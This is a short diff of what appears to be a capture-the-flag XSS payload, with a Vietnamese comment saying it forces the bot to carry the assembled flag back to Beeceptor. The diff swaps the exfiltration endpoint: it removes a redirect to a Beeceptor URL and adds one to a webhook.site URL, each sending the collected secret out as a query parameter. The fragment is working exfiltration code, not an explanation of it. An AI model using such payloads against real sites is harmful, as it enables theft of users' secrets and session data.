@@ -57,5 +57,5 @@
     }
     
     // KẾT THÚC: Ép Bot mang toàn bộ lá cờ vừa ghép được bay về Beeceptor!
-    window.location = 'https://khanh.free.beeceptor.com/?THE_FLAG_IS=' + encodeURIComponent(flag);
+    window.location = 'https://webhook.site/2fc3e3e9-24dd-4048-91c9-b5cc45619d1d/?THE_FLAG_IS=' + encodeURIComponent(flag);
 })();
